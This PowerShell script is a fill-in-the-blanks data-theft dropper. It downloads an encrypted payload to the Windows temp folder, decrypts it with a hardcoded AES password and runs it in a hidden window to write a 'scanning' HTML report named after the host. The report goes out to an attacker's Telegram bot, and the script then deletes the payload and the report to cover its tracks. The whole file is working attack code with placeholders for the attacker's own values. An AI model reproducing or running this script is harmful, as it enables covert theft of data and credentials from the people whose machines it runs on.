$url = "url of your repositors"
$tempPath = "C:\Windows\Temp"
$filename = "name of your encrypted file in repositors"
$finalPath = Join-Path -Path $tempPath -ChildPath $filename

Invoke-WebRequest -Uri $url -OutFile $finalPath -ErrorAction Stop


while (-not (Test-Path -Path $finalPath -ErrorAction SilentlyContinue)) {
    Start-Sleep -Seconds 1
}

function Decrypt-File {
    param(
        [String]$InputFile,
        [String]$OutputFile,
        [String]$Password
    )

    $key = New-Object Byte[] 32
    $encoding = [Text.Encoding]::UTF8
    [Buffer]::BlockCopy($encoding.GetBytes($Password), 0, $key, 0, [Math]::Min($key.Length, $encoding.GetByteCount($Password)))

    $aesManaged = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aesManaged.Key = $key
    $aesManaged.IV = $key[0..15]
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC

    $encryptedData = [System.IO.File]::ReadAllBytes($InputFile)
    $decryptor = $aesManaged.CreateDecryptor($aesManaged.Key, $aesManaged.IV)
    $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
    [System.IO.File]::WriteAllBytes($OutputFile, $decryptedData)
    $aesManaged.Dispose()
}

# Decrypt the file
$InputFile = $finalPath
$OutputFile = "path for your output"
$Password = "R7b@93#zF4$Tg21q"
Decrypt-File -InputFile $InputFile -OutputFile $OutputFile -Password $Password



function Generate-UniqueFilename {
    $hostname = $env:COMPUTERNAME
    return "scanning_$hostname.html"
}


$HTML_FILENAME = Join-Path -Path $tempPath -ChildPath (Generate-UniqueFilename)

function Run-BatchFile {
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "cmd.exe"
    $startInfo.Arguments = "/c start $OutputFile /shtml `"$HTML_FILENAME`""
    $startInfo.RedirectStandardOutput = $true
    $startInfo.RedirectStandardError = $true
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true

    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $startInfo
    $process.Start() | Out-Null
    $process.WaitForExit()

}

Run-BatchFile


Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.IO.Compression.FileSystem

function Generate-UniqueFilename {
    $hostname = $env:COMPUTERNAME
    return "scanning_$hostname.html"
}


$TEMP_DIR = "C:\Windows\Temp"
$HTML_FILENAME = Join-Path -Path $TEMP_DIR -ChildPath (Generate-UniqueFilename)
$TELEGRAM_BOT_TOKEN = 'set your bot token'
$TELEGRAM_USER_ID = 'set your telegram id'

$timeout = 30
$waited = 0
while (-not (Test-Path -Path $HTML_FILENAME) -and $waited -lt $timeout) {
    Start-Sleep -Seconds 1
    $waited += 1
}


$fileStream = [System.IO.File]::Open($HTML_FILENAME, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
if ($fileStream) {
    $fileStream.Close()
}

function Send-TelegramFile {
    param (
        [string]$botToken,
        [string]$userId,
        [string]$documentPath
    )

    $url = "https://api.telegram.org/bot$botToken/sendDocument"
    $fileName = [System.IO.Path]::GetFileName($documentPath)
    $fileStream = [System.IO.File]::OpenRead($documentPath)

    $content = [System.Net.Http.MultipartFormDataContent]::new()
    $fileContent = [System.Net.Http.StreamContent]::new($fileStream)
    $fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new("form-data")
    $fileContent.Headers.ContentDisposition.Name = '"document"'
    $fileContent.Headers.ContentDisposition.FileName = '"' + $fileName + '"'
    $content.Add($fileContent)
    $content.Add([System.Net.Http.StringContent]::new($userId), '"chat_id"')

    $client = [System.Net.Http.HttpClient]::new()

    $response = $client.PostAsync($url, $content).Result

    if ($fileStream) {
        $fileStream.Close()
    }
    if ($client) {
        $client.Dispose()
    }
   

    Remove-Item -Path $documentPath -ErrorAction SilentlyContinue
    Remove-Item -Path $OutputFile -ErrorAction SilentlyContinue
    Remove-Item -Path $InputFile -ErrorAction SilentlyContinue
}


Send-TelegramFile -botToken $TELEGRAM_BOT_TOKEN -userId $TELEGRAM_USER_ID -documentPath $HTML_FILENAME
